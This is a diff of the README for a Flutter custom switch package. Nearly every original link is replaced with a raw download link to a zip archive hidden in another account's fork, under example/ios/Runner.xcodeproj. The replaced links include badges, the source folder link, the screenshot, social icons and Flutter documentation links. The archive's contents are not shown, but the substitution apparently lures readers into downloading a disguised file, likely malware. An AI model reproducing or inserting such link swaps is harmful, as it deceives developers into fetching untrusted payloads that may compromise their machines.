@@ -2,16 +2,16 @@
 
 Beautiful Custom Switch package created with Flutter.
 
-[![Say Thanks!](https://img.shields.io/badge/Say%20Thanks-!-1EAEDB.svg)](https://saythanks.io/to/mohak1283)  
+[![Say Thanks!](https://img.shields.io/badge/Say%20Thanks-!-1EAEDB.svg)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)  
 
 
-The source code is **100% Dart**, and everything resides in the [/lib](https://github.com/mohak1283/CustomSwitch/tree/master/lib) folder.
+The source code is **100% Dart**, and everything resides in the [/lib](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip) folder.
 
 ## Show some :heart: and star the repo to support the project
 
- [![GitHub followers](https://img.shields.io/github/followers/mohak1283.svg?style=social&label=Follow)](https://github.com/mohak1283)  [![Twitter Follow](https://img.shields.io/twitter/follow/mohak_gupta20.svg?style=social)](https://twitter.com/mohak_gupta20)
+ [![GitHub followers](https://img.shields.io/github/followers/mohak1283.svg?style=social&label=Follow)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)  [![Twitter Follow](https://img.shields.io/twitter/follow/mohak_gupta20.svg?style=social)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)
 
-[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=102)](https://opensource.org/licenses/Apache-2.0)
+[![Open Source Love](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)
 
 
 
@@ -73,7 +73,7 @@ class _HomeScreenState extends State<HomeScreen> {
 ```
 ## Screenshots
 
- ![custom_switch](https://user-images.githubusercontent.com/35039342/60429173-1cedb780-9c18-11e9-8fcf-c0c7a52b0e2d.gif) 
+ ![custom_switch](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip) 
 
 
 ## 👨 Developed By
@@ -83,10 +83,10 @@ Mohak Gupta
 ```
 
 
-<a href="https://twitter.com/mohak_gupta20"><img src="https://user-images.githubusercontent.com/35039342/55471524-8e24cb00-5627-11e9-9389-58f3d4419153.png" width="60"></a>
-<a href="https://www.linkedin.com/in/mohak-gupta-885669131/"><img src="https://user-images.githubusercontent.com/35039342/55471530-94b34280-5627-11e9-8c0e-6fe86a8406d6.png" width="60"></a>
-<a href="https://www.facebook.com/mohak.gupta.9083"><img src="https://github.com/aritraroy/social-icons/blob/master/facebook-icon.png?raw=true" width="60"></a>
-<a href="https://medium.com/@mohak1936"><img src="https://user-images.githubusercontent.com/35039342/60429733-5a9f1000-9c19-11e9-9243-54052a4e4f05.png" width="60"></a>
+<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
+<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
+<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
+<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
 
 
 # 👍 How to Contribute
@@ -109,6 +109,6 @@ Mohak Gupta
 
 ## Getting Started
 
-For help getting started with Flutter, view our online [documentation](https://flutter.dev/).
+For help getting started with Flutter, view our online [documentation](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip).
 
-For help on editing package code, view the [documentation](https://flutter.dev/developing-packages/).
+For help on editing package code, view the [documentation](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip).
